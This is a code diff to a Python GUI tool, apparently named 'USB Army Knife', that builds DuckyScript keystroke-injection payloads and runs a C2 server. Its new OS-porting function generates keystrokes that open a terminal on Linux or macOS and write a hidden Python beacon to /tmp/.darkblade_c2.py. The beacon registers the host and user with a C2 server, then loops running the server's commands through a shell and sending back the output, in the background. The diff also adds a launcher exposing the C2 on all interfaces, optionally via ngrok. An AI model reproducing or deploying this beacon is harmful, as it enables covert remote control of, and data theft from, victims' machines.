@@ -379,9 +379,16 @@ class USBArmyKnifeInstaller(tk.Window):
     def create_duckyscript_tab(self):
         duckyscript_frame = tk.Frame(self.notebook)
         self.notebook.add(duckyscript_frame, text="DuckyScript")
+        try:
+            # Remember the main notebook tab id for later selection
+            self._main_tab_duckyscript = self.notebook.tabs()[-1]
+        except Exception:
+            pass
 
         ducky_notebook = tk.Notebook(duckyscript_frame)
         ducky_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        # Keep a reference to the inner notebook for programmatic tab switching
+        self.ducky_notebook = ducky_notebook
 
         self.create_editor_tab(ducky_notebook)
         self.create_converter_tab(ducky_notebook)
@@ -425,6 +432,10 @@ class USBArmyKnifeInstaller(tk.Window):
         self.target_os = tk.Combobox(manifest_frame, state="readonly", values=["windows","linux","macos","generic"]) 
         self.target_os.grid(row=0, column=3, padx=5, pady=5, sticky=EW)
         self.target_os.set("generic")
+        try:
+            self.target_os.bind("<<ComboboxSelected>>", self._on_target_os_changed)
+        except Exception:
+            pass
         manifest_frame.columnconfigure(1, weight=1)
 
         notes_frame = tk.Frame(manifest_frame)
@@ -459,10 +470,16 @@ class USBArmyKnifeInstaller(tk.Window):
         except Exception:
             pass
 
+        tk.Button(controls_frame, text="Import...", command=self.import_script_to_editor).pack(side=tk.LEFT, padx=5)
         tk.Button(controls_frame, text="Insert Template", command=self.insert_template).pack(side=tk.LEFT, padx=5)
         tk.Button(controls_frame, text="Lint", command=self.run_lint).pack(side=tk.LEFT, padx=5)
         tk.Button(controls_frame, text="Fill Parameters", command=self.fill_parameters).pack(side=tk.LEFT, padx=5)
         tk.Button(controls_frame, text="Calibrate Delays", command=self.calibrate_delays).pack(side=tk.LEFT, padx=5)
+        
+        # OS porting controls
+        self.auto_port_var = tk.IntVar(value=0)
+        tk.Checkbutton(controls_frame, text="Auto-port on Save", variable=self.auto_port_var).pack(side=tk.LEFT, padx=10)
+        tk.Button(controls_frame, text="Port to OS", command=self.port_script_now).pack(side=tk.LEFT, padx=5)
 
         self.armed_var = tk.IntVar(value=0)
         tk.Checkbutton(controls_frame, text="Armed (consent)", variable=self.armed_var).pack(side=tk.LEFT, padx=10)
@@ -487,6 +504,11 @@ class USBArmyKnifeInstaller(tk.Window):
     def create_converter_tab(self, ducky_notebook):
         converter_frame = tk.Frame(ducky_notebook)
         ducky_notebook.add(converter_frame, text="Converter")
+        try:
+            # Remember converter tab id for later selection
+            self._ducky_converter_tab = ducky_notebook.tabs()[-1]
+        except Exception:
+            pass
 
         # Add converter widgets
         from_label = tk.Label(converter_frame, text="From:")
@@ -501,6 +523,7 @@ class USBArmyKnifeInstaller(tk.Window):
         self.to_combobox = tk.Combobox(converter_frame, state="readonly", values=["DuckyScript 1.0", "DuckyScript 2.0", "DuckyScript 3.0"])
         self.to_combobox.pack(pady=5)
 
+        tk.Button(converter_frame, text="Import to Editor...", command=self.import_script_to_editor).pack(pady=5)
         convert_button = tk.Button(converter_frame, text="Convert", command=self.convert_script)
         convert_button.pack(pady=10)
 
@@ -1104,7 +1127,7 @@ endif
         cfg = {}
         try:
             with open("settings.json", "r", encoding="utf-8") as cf:
-                cfg = json.load(cf)
+                cfg = json.load(cf) or {}
         except Exception:
             cfg = {}
         layout = (cfg.get("layout") or "EN_US")
@@ -1117,10 +1140,28 @@ endif
                 self.layout_combobox.set(layout)
         except Exception:
             pass
+        # Load persisted C2 API key if available
+        try:
+            key = (cfg.get("c2_api_key") or "").strip()
+            if key:
+                self.c2_api_key = key
+                # If UI already exists, reflect it
+                try:
+                    self._update_api_key_ui()
+                except Exception:
+                    pass
+        except Exception:
+            pass
 
     def _save_prefs(self):
-        cfg = {"layout": self._selected_layout()}
+        # Merge with existing settings to avoid clobbering other values
         try:
+            try:
+                with open("settings.json", "r", encoding="utf-8") as cf:
+                    cfg = json.load(cf) or {}
+            except Exception:
+                cfg = {}
+            cfg["layout"] = self._selected_layout()
             with open("settings.json", "w", encoding="utf-8") as cf:
                 json.dump(cfg, cf, indent=2)
         except Exception:
@@ -1175,7 +1216,7 @@ endif
         self.duckyscript_editor.tag_remove("kw", "1.0", tk.END)
         self.duckyscript_editor.tag_remove("comment", "1.0", tk.END)
         # Highlight comments and keywords
-        kw = r"^(REM|DELAY|DEFAULT_DELAY|DEFAULTDELAY|STRING|ENTER|GUI|CTRL|ALT|SHIFT|REPEAT|KEYBOARD_LAYOUT|LED_OFF|TFT_OFF|TFT_ON)\b"
+        kw = r"^(REM|DELAY|DEFAULT_DELAY|DEFAULTDELAY|DEFAULT_CHAR_DELAY|STRING_DELAY|DELAY_RANDOM|JITTER|STRING|STRINGLN|ENTER|GUI|CTRL|ALT|SHIFT|TAB|ESC|BACKSPACE|SPACE|DELETE|INSERT|UP|DOWN|LEFT|RIGHT|HOME|END|PAGEUP|PAGEDOWN|PRINTSCREEN|MENU|CAPSLOCK|NUMLOCK|SCROLLLOCK|F1|F2|F3|F4|F5|F6|F7|F8|F9|F10|F11|F12|REPEAT|KEYDOWN|KEYUP|HOLD|RELEASE|KEYBOARD_LAYOUT|LED_OFF|LED_ON|LED_BLINK|TFT_OFF|TFT_ON|TFT_TEXT|BEEP|VIBRATE|MOUSE_MOVE|MOUSE_SCROLL|MOUSE_LEFT|MOUSE_RIGHT|MOUSE_MIDDLE|OPENURL|RUN|SHELL|CLIPBOARD_SET|CLIPBOARD_PASTE|WAIT_FOR_WINDOW|WAIT_FOR_TEXT|WAIT_NET|IF|ELSE|ENDIF|WHILE|ENDWHILE|FUNCTION|ENDFUNCTION|CALL|INCLUDE)\b"
         for i, line in enumerate(text.splitlines(), start=1):
             if line.strip().startswith("REM"):
                 self.duckyscript_editor.tag_add("comment", f"{i}.0", f"{i}.end")
@@ -1189,7 +1230,18 @@ endif
     def run_lint(self):
         issues = []
         text = self.duckyscript_editor.get("1.0", tk.END).splitlines()
-        valid_cmds = {"REM","DELAY","DEFAULT_DELAY","DEFAULTDELAY","STRING","ENTER","GUI","CTRL","ALT","SHIFT","REPEAT","KEYBOARD_LAYOUT","LED_OFF","TFT_OFF","TFT_ON"}
+        valid_cmds = {
+            "REM","DELAY","DEFAULT_DELAY","DEFAULTDELAY","DEFAULT_CHAR_DELAY","STRING_DELAY","DELAY_RANDOM","JITTER",
+            "STRING","STRINGLN","ENTER","GUI","CTRL","ALT","SHIFT","TAB","ESC","BACKSPACE","SPACE","DELETE","INSERT",
+            "UP","DOWN","LEFT","RIGHT","HOME","END","PAGEUP","PAGEDOWN","PRINTSCREEN","MENU","CAPSLOCK","NUMLOCK","SCROLLLOCK",
+            "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12",
+            "REPEAT","KEYDOWN","KEYUP","HOLD","RELEASE","KEYBOARD_LAYOUT",
+            "LED_OFF","LED_ON","LED_BLINK","TFT_OFF","TFT_ON","TFT_TEXT","BEEP","VIBRATE",
+            "MOUSE_MOVE","MOUSE_SCROLL","MOUSE_LEFT","MOUSE_RIGHT","MOUSE_MIDDLE",
+            "OPENURL","RUN","SHELL","CLIPBOARD_SET","CLIPBOARD_PASTE",
+            "WAIT_FOR_WINDOW","WAIT_FOR_TEXT","WAIT_NET",
+            "IF","ELSE","ENDIF","WHILE","ENDWHILE","FUNCTION","ENDFUNCTION","CALL","INCLUDE"
+        }
         for idx, line in enumerate(text, start=1):
             s = line.strip()
             if not s:
@@ -1200,9 +1252,22 @@ endif
             cmd = parts[0].upper()
             if cmd not in valid_cmds and not re.match(r"^\$[A-Za-z_][A-Za-z0-9_]*\s*=", s):
                 issues.append((idx, f"Unknown command '{parts[0]}'"))
-            if cmd in ("DELAY","DEFAULT_DELAY","DEFAULTDELAY"):
+            # Single-number timing commands
+            if cmd in ("DELAY","DEFAULT_DELAY","DEFAULTDELAY","DEFAULT_CHAR_DELAY","STRING_DELAY","MOUSE_SCROLL"):
                 if len(parts) < 2 or not parts[1].isdigit():
-                    issues.append((idx, f"{cmd} requires numeric milliseconds"))
+                    issues.append((idx, f"{cmd} requires a numeric value"))
+            # JITTER n or n%
+            if cmd == "JITTER":
+                if len(parts) < 2 or not re.match(r"^\d+%?$", parts[1]):
+                    issues.append((idx, "JITTER requires a number or percentage (e.g., 10 or 10%)"))
+            # DELAY_RANDOM a b
+            if cmd == "DELAY_RANDOM":
+                if len(parts) < 3 or not (parts[1].isdigit() and parts[2].isdigit()):
+                    issues.append((idx, "DELAY_RANDOM requires two numeric millisecond values"))
+            # MOUSE_MOVE x y
+            if cmd == "MOUSE_MOVE":
+                if len(parts) < 3 or not (parts[1].lstrip('-').isdigit() and parts[2].lstrip('-').isdigit()):
+                    issues.append((idx, "MOUSE_MOVE requires two integer values (x y)"))
         # Output
         self.lint_output.config(state=tk.NORMAL)
         self.lint_output.delete("1.0", tk.END)
@@ -1215,20 +1280,119 @@ endif
         return issues
 
     def insert_template(self):
+        # Template Browser dialog with preview and one-click insert
         templates = {
             "Notepad Hello": (
                 """REM Description: Open Notepad and type greeting\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 500\nSTRING Hello, World!\n"""
             ),
             "Run Dialog": (
                 """REM Description: Run dialog and echo\nGUI r\nDELAY 300\nSTRING cmd /c echo ${MESSAGE}\nENTER\n"""
+            ),
+            "Open URL": (
+                """REM Open a URL (Windows)\nGUI r\nDELAY 300\nSTRING cmd /c start https://example.com\nENTER\n"""
+            ),
+            "Clipboard Paste": (
+                """REM Set clipboard and paste\nCLIPBOARD_SET Hello_from_Clipboard\nDELAY 100\nCLIPBOARD_PASTE\n"""
+            ),
+            "Jitter & Random Delay": (
+                """REM Use jitter and random delay between actions\nDEFAULT_DELAY 50\nJITTER 15%\nDELAY_RANDOM 200 400\nSTRING Typing with randomized delays...\nENTER\n"""
+            ),
+            "Mouse Move & Click": (
+                """REM Move cursor and click\nMOUSE_MOVE 100 50\nDELAY 100\nMOUSE_LEFT\nDELAY 200\nMOUSE_RIGHT\n"""
+            ),
+            "Key Combos": (
+                """REM Press CTRL+ALT+DEL via keydown/keyup\nKEYDOWN CTRL\nKEYDOWN ALT\nKEYDOWN DEL\nDELAY 50\nKEYUP DEL\nKEYUP ALT\nKEYUP CTRL\n"""
+            ),
+            "Function Keys": (
+                """REM Use function keys and arrows\nF5\nDELAY 200\nTAB\nTAB\nENTER\nUP\nDOWN\nLEFT\nRIGHT\n"""
+            ),
+            "Wait for Window/Text": (
+                """REM Wait for a window or prompt text\nWAIT_FOR_WINDOW Notepad\nWAIT_FOR_TEXT C:\\>\nSTRING dir\nENTER\n"""
+            ),
+            "Flow Control": (
+                """REM Conditional execution example\n$os = windows\nIF $os == windows\n    GUI r\n    DELAY 300\n    STRING cmd /c whoami\n    ENTER\nELSE\n    GUI r\n    DELAY 300\n    STRING bash -lc whoami\n    ENTER\nENDIF\n"""
+            ),
+            "LED/TFT/Buzzer": (
+                """REM Device feedback\nLED_ON\nLED_BLINK red 2\nTFT_TEXT Demo running...\nBEEP 880 200\nVIBRATE 100\n"""
+            ),
+            "Run Shell": (
+                """REM Launch a shell command\nRUN cmd /c ipconfig /all\nDELAY 500\nRUN powershell Get-Date\n"""
+            ),
+            "Mouse Scroll": (
+                """REM Scroll down a page\nMOUSE_SCROLL 5\n"""
+            ),
+            "Include File": (
+                """REM Include another script file\nINCLUDE helper.ds\n"""
+            ),
+            "STRINGLN Example": (
+                """REM Print a line with newline automatically\nSTRINGLN Printing a full line\n"""
             )
         }
-        names = list(templates.keys())
-        choice = simpledialog.askstring("Insert Template", "Choose: " + ", ".join(names))
-        if choice and choice in templates:
-            self.duckyscript_editor.insert(tk.INSERT, templates[choice])
+
+        # Build dialog
+        dlg = tk.Toplevel(self)
+        dlg.title("Template Browser")
+        try:
+            dlg.geometry("700x420")
+        except Exception:
+            pass
+        dlg.transient(self)
+        dlg.grab_set()
+
+        # Left: list
+        left = tk.Frame(dlg)
+        left.pack(side=tk.LEFT, fill=tk.Y, padx=8, pady=8)
+        lb = Listbox(left, width=28, height=18)
+        lb.pack(fill=tk.Y, expand=False)
+
+        # Right: preview
+        right = tk.Frame(dlg)
+        right.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0,8), pady=8)
+        preview = tk.Text(right, wrap=tk.NONE, height=18)
+        preview.pack(fill=tk.BOTH, expand=True)
+
+        # Bottom buttons
+        btns = tk.Frame(dlg)
+        btns.pack(side=tk.BOTTOM, fill=tk.X, padx=8, pady=8)
+        ins_btn = tk.Button(btns, text="Insert", command=lambda: do_insert())
+        ins_btn.pack(side=tk.RIGHT, padx=5)
+        tk.Button(btns, text="Cancel", command=dlg.destroy).pack(side=tk.RIGHT)
+
+        # Populate list
+        names = sorted(templates.keys())
+        for n in names:
+            lb.insert(tk.END, n)
+        if names:
+            lb.selection_set(0)
+            preview.delete("1.0", tk.END)
+            preview.insert(tk.END, templates[names[0]])
+
+        def on_select(event=None):
+            sel = lb.curselection()
+            if not sel:
+                return
+            name = names[sel[0]]
+            preview.config(state=tk.NORMAL)
+            preview.delete("1.0", tk.END)
+            preview.insert(tk.END, templates[name])
+            preview.config(state=tk.NORMAL)
+
+        def do_insert():
+            sel = lb.curselection()
+            if not sel:
+                dlg.destroy()
+                return
+            name = names[sel[0]]
+            self.duckyscript_editor.insert(tk.INSERT, templates[name])
             self._highlight_editor()
             self.run_lint()
+            try:
+                dlg.destroy()
+            except Exception:
+                pass
+
+        lb.bind("<<ListboxSelect>>", on_select)
+        lb.bind("<Double-Button-1>", lambda e: do_insert())
 
     def fill_parameters(self):
         text = self.duckyscript_editor.get("1.0", tk.END)
@@ -1324,8 +1488,157 @@ endif
     def stop_simulation(self):
         self._sim_running = False
 
+    # ----- OS-specific porting -----
+    def port_script_now(self):
+        tgt = (self.target_os.get() or 'generic').lower()
+        if tgt not in ('windows','linux','macos'):
+            messagebox.showinfo("Porting", "Select a specific Target OS (windows/linux/macos) first.")
+            return
+        src = self.duckyscript_editor.get("1.0", tk.END)
+        try:
+            out = self._port_duckyscript(tgt, src)
+            self.duckyscript_editor.delete("1.0", tk.END)
+            self.duckyscript_editor.insert(tk.END, out)
+            self._highlight_editor()
+            self.run_lint()
+            messagebox.showinfo("Porting", f"Script ported for {tgt}.")
+        except Exception as e:
+            messagebox.showerror("Porting", str(e))
+
+    def _on_target_os_changed(self, event=None):
+        try:
+            tgt = (self.target_os.get() or 'generic').lower()
+            if tgt in ('windows','linux','macos'):
+                src = self.duckyscript_editor.get("1.0", tk.END)
+                out = self._port_duckyscript(tgt, src)
+                self.duckyscript_editor.delete("1.0", tk.END)
+                self.duckyscript_editor.insert(tk.END, out)
+                self._highlight_editor()
+                self.run_lint()
+        except Exception:
+            pass
+
+    def _port_duckyscript(self, target: str, text: str) -> str:
+        # If this looks like a PowerShell C2 beacon, replace with a proper Linux/macOS beacon
+        if target in ('linux','macos') and ("USB Army Knife C2 Beacon" in text or "Invoke-RestMethod" in text or "/api/beacon" in text):
+            # Try to extract server URL from REM header or first URL in text
+            server = "http://127.0.0.1:5000"
+            for line in text.splitlines():
+                if line.strip().upper().startswith("REM SERVER:"):
+                    server = line.split(":",1)[1].strip()
+                    break
+            if server == "http://127.0.0.1:5000":
+                m = re.search(r"https?://[\w\.-]+(?::\d+)?", text)
+                if m:
+                    server = m.group(0)
+            # Build a Python beacon (stdlib only) and run it in a terminal
+            seq = []
+            if target == 'linux':
+                seq += ["CTRL ALT T", "DELAY 700"]
+            else:
+                # macOS: open Terminal via Spotlight
+                seq += ["CMD SPACE", "DELAY 300", "STRING Terminal", "ENTER", "DELAY 1000"]
+            seq += [
+                "STRING cat > /tmp/.darkblade_c2.py <<'PY'", "ENTER",
+                "STRING import urllib.request, json, time, os, platform, subprocess", "ENTER",
+                f"STRING c2='{server}'", "ENTER",
+                "STRING h=platform.node()", "ENTER",
+                "STRING try:\n    u=os.getlogin()", "ENTER",
+                "STRING except Exception:\n    u=os.getenv('USER') or 'user'", "ENTER",
+                "STRING o=platform.platform()", "ENTER",
+                "STRING data=json.dumps({'hostname':h,'username':u,'os':o}).encode()", "ENTER",
+                "STRING req=urllib.request.Request(c2+'/api/beacon/register',data=data,headers={'Content-Type':'application/json'})", "ENTER",
+                "STRING bid=json.loads(urllib.request.urlopen(req,timeout=10).read().decode()).get('beacon_id','')", "ENTER",
+                "STRING while True:", "ENTER",
+                "STRING     try:", "ENTER",
+                "STRING         req=urllib.request.Request(c2+'/api/beacon/checkin/'+bid, data=b'')", "ENTER",
+                "STRING         j=json.loads(urllib.request.urlopen(req,timeout=10).read().decode())", "ENTER",
+                "STRING         cmds=j.get('commands',[])", "ENTER",
+                "STRING         for c in cmds:", "ENTER",
+                "STRING             cid=c.get('id'); cmd=c.get('command')", "ENTER",
+                "STRING             p=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)", "ENTER",
+                "STRING             out=p.communicate()[0]", "ENTER",
+                "STRING             res=json.dumps({'result':out}).encode()", "ENTER",
+                "STRING             req=urllib.request.Request(c2+'/api/beacon/result/'+str(cid), data=res, headers={'Content-Type':'application/json'})", "ENTER",
+                "STRING             urllib.request.urlopen(req,timeout=10).read()", "ENTER",
+                "STRING     except Exception as e:", "ENTER",
+                "STRING         time.sleep(10)", "ENTER",
+                "STRING     time.sleep(60)", "ENTER",
+                "STRING PY", "ENTER",
+                "STRING python3 /tmp/.darkblade_c2.py &", "ENTER"
+            ]
+            header = [f"REM Ported for {target}", f"REM Server: {server}"]
+            return "\n".join(header + seq)
+
+        # Otherwise do lightweight mapping of common commands
+        lines = []
+        open_term_injected = False
+        for raw in text.splitlines():
+            line = raw
+            s = raw.strip()
+            u = s.upper()
+            # Map GUI r
+            if re.match(r"^GUI\s+r\b", s, flags=re.IGNORECASE):
+                if target == 'linux':
+                    line = "CTRL ALT T\nDELAY 600"
+                    open_term_injected = True
+                elif target == 'macos':
+                    # Spotlight -> Terminal
+                    line = "CMD SPACE\nDELAY 300\nSTRING Terminal\nENTER\nDELAY 800"
+                    open_term_injected = True
+                else:
+                    line = raw
+            # Map STRING cmd /c ... -> bash -lc "..."
+            m = re.match(r"^STRING\s+cmd\s+/c\s+(.*)$", s, flags=re.IGNORECASE)
+            if m and target in ('linux','macos'):
+                payload = m.group(1)
+                # Replace Windows path backslashes
+                payload = payload.replace('\\\\','/').replace('\\','/')
+                line = f'STRING bash -lc "{payload}"'
+            # Map powershell one-liners to rough bash equivalents
+            m2 = re.match(r"^STRING\s+powershell(.*)$", s, flags=re.IGNORECASE)
+            if m2 and target in ('linux','macos'):
+                rest = m2.group(1).strip()
+                trans = rest
+                trans = trans.replace("Get-ComputerInfo","uname -a")
+                trans = trans.replace("Get-Date","date")
+                line = f'STRING bash -lc "{trans}"'
+            # Map common commands inside STRING
+            if s.upper().startswith("STRING "):
+                body = raw.split(" ",1)[1]
+                if target in ('linux','macos'):
+                    rep = body
+                    # Windows command translations
+                    rep = re.sub(r"\bipconfig\b", "ip a", rep, flags=re.IGNORECASE)
+                    rep = re.sub(r"\bsysteminfo\b", "uname -a; lsb_release -a || cat /etc/os-release", rep, flags=re.IGNORECASE)
+                    rep = re.sub(r"\bdir\b", "ls -la", rep, flags=re.IGNORECASE)
+                    rep = rep.replace('\\\\','/').replace('\\','/')
+                    # notepad -> gedit (or nano if terminal opened)
+                    if re.search(r"\bnotepad\b", rep, flags=re.IGNORECASE):
+                        rep = re.sub(r"\bnotepad\b", "gedit" if not open_term_injected else "nano", rep, flags=re.IGNORECASE)
+                    line = f"STRING {rep}"
+                elif target == 'windows':
+                    line = raw
+            # Map RUN command (our extended DSL)
+            if u.startswith('RUN '):
+                cmd = raw.split(' ',1)[1]
+                if target in ('linux','macos'):
+                    line = f'STRING bash -lc "{cmd}"\nENTER'
+                else:
+                    line = f'STRING cmd /c {cmd}\nENTER'
+            lines.append(line)
+        # Add header comment
+        return "REM Ported for " + target + "\n" + "\n".join(lines)
+
     def _build_script_with_manifest(self):
         content = self.duckyscript_editor.get("1.0", tk.END)
+        # Optional OS-specific porting
+        try:
+            tgt = (self.target_os.get() or 'generic').lower()
+            if tgt in ('windows','linux','macos') and self.auto_port_var.get() == 1:
+                content = self._port_duckyscript(tgt, content)
+        except Exception:
+            pass
         # Ensure CRLF endings
         content = content.replace("\r\n", "\n").replace("\r", "\n").replace("\n", "\r\n")
         lines = [
@@ -1404,12 +1717,81 @@ endif
         except Exception as e:
             messagebox.showerror("Error", str(e))
 
+    def import_script_to_editor(self):
+        """Import a script file directly into the editor for conversion and editing.
+        Also attempts to auto-detect source format (BadUSB/BadKB/DuckyScript)
+        and preselects the converter dropdowns accordingly.
+        """
+        src = filedialog.askopenfilename(
+            title="Import script",
+            filetypes=[
+                ("DuckyScript", "*.ds"),
+                ("Text", "*.txt"),
+                ("All", "*.*"),
+            ]
+        )
+        if not src:
+            return
+        try:
+            with open(src, "r", errors="ignore") as f:
+                content = f.read()
+            self.duckyscript_editor.delete("1.0", tk.END)
+            self.duckyscript_editor.insert(tk.END, content)
+            self._highlight_editor()
+            self.run_lint()
+            # Auto-detect and preselect converter format
+            try:
+                fmt = self._detect_external_script_format(content)
+                if fmt in ("BadUSB", "BadKB") and hasattr(self, 'from_combobox'):
+                    self.from_combobox.set(fmt)
+                    # Default target
+                    if hasattr(self, 'to_combobox') and not (self.to_combobox.get() or '').strip():
+                        self.to_combobox.set("DuckyScript 2.0")
+                    # Focus the Converter tab to encourage conversion workflow
+                    try:
+                        if hasattr(self, 'ducky_notebook') and hasattr(self, '_ducky_converter_tab'):
+                            # Ensure outer DuckyScript main tab is selected
+                            if hasattr(self, 'notebook') and hasattr(self, '_main_tab_duckyscript'):
+                                self.notebook.select(self._main_tab_duckyscript)
+                            self.ducky_notebook.select(self._ducky_converter_tab)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+        except Exception as e:
+            messagebox.showerror("Import", str(e))
+
     def _audit_log(self, msg):
         try:
             with open("audit.log", "a", encoding="utf-8") as lf:
                 lf.write(f"{datetime.utcnow().isoformat()}Z - {msg}\n")
         except Exception:
             pass
+
+    def _detect_external_script_format(self, content: str) -> str:
+        """Heuristically detect if an external script is BadUSB, BadKB, or DuckyScript.
+        Returns one of: 'BadKB', 'BadUSB', 'DuckyScript'.
+        """
+        txt = content or ""
+        lines = [l.strip() for l in txt.splitlines() if l.strip()]
+        head = "\n".join(lines[:50]).lower()
+
+        # Indicators for DuckyScript
+        ds_tokens = (
+            "rem ", "delay ", "default_delay", "defaultdelay", "string ", "enter",
+            "gui ", "ctrl ", "alt ", "shift ", "repeat ", "keyboard_layout ", "led_off", "tft_off", "tft_on"
+        )
+        if any(l.upper().startswith(("REM","DELAY","DEFAULT_DELAY","DEFAULTDELAY","STRING","ENTER","GUI","CTRL","ALT","SHIFT","REPEAT","KEYBOARD_LAYOUT","LED_OFF","TFT_OFF","TFT_ON")) for l in lines[:100]):
+            return "DuckyScript"
+
+        # Indicators for BadKB (function-like syntax / Key enums)
+        if re.search(r"\b(Press|Release|Type|TypeLine|Delay|Repeat)\s*\(", content):
+            return "BadKB"
+        if re.search(r"\bKey\.[A-Z0-9_]+", content):
+            return "BadKB"
+
+        # Fallback to BadUSB if not DS/BadKB
+        return "BadUSB"
 
     def _install_clipboard_support(self):
         # Global keybindings for copy/paste/select-all
@@ -3300,12 +3682,15 @@ endif
         try:
             # Create a launcher script that imports and runs the C2 server
             launcher_script = f'''#!/usr/bin/env python3
-import os, sys
+import os, sys, importlib.util
 base_dir = os.path.abspath(os.path.dirname(__file__))
-sys.path.insert(0, base_dir)
-sys.path.insert(0, os.path.join(base_dir, 'c2_server'))
+root_dir = os.path.abspath(os.path.join(base_dir, '..'))
+c2_path = os.path.join(root_dir, 'c2_server', 'c2_server.py')
 
-from c2_server.c2_server import C2Server
+spec = importlib.util.spec_from_file_location('darkblade_c2', c2_path)
+mod = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(mod)
+C2Server = mod.C2Server
 
 if __name__ == "__main__":
     server = C2Server(host="0.0.0.0", port={port}, use_ssl=False, use_ngrok={bool(self.c2_use_ngrok.get())}, ngrok_token={repr(self.c2_ngrok_token.get().strip()) if hasattr(self, 'c2_ngrok_token') else 'None'})
@@ -3372,12 +3757,17 @@ if __name__ == "__main__":
             print(f"[!] Error capturing C2 output: {e}")
     
     def _update_api_key_ui(self):
-        """Update the API key display in the UI"""
+        """Update the API key display in the UI and persist it locally."""
         if hasattr(self, 'c2_api_key') and self.c2_api_key:
             # Show first and last 8 chars with ... in between for security
             display_key = f"{self.c2_api_key[:8]}...{self.c2_api_key[-8:]}"
             self.c2_api_key_label.config(text=display_key, foreground="#00ff00")
             self.c2_copy_key_btn.config(state=tk.NORMAL)
+            # Persist key to settings.json (0600) for convenience
+            try:
+                self._persist_c2_api_key(self.c2_api_key)
+            except Exception:
+                pass
     
     def copy_c2_api_key(self):
         """Copy the C2 API key to clipboard"""
@@ -3410,6 +3800,30 @@ if __name__ == "__main__":
         self.c2_copy_key_btn.config(state=tk.DISABLED)
         
         messagebox.showinfo("Stopped", "C2 server stopped")
+
+    def _persist_c2_api_key(self, key: str):
+        """Persist API key in settings.json with user-only permissions.
+        This is convenient for single-user setups; kept local and not printed to logs.
+        """
+        if not key:
+            return
+        try:
+            # Merge settings
+            try:
+                with open("settings.json", "r", encoding="utf-8") as cf:
+                    cfg = json.load(cf) or {}
+            except Exception:
+                cfg = {}
+            cfg["c2_api_key"] = key
+            # Write and chmod to 0600
+            with open("settings.json", "w", encoding="utf-8") as cf:
+                json.dump(cfg, cf, indent=2)
+            try:
+                os.chmod("settings.json", 0o600)
+            except Exception:
+                pass
+        except Exception:
+            pass
     
     def _fetch_ngrok_url(self):
         """Fetch ngrok public URL"""
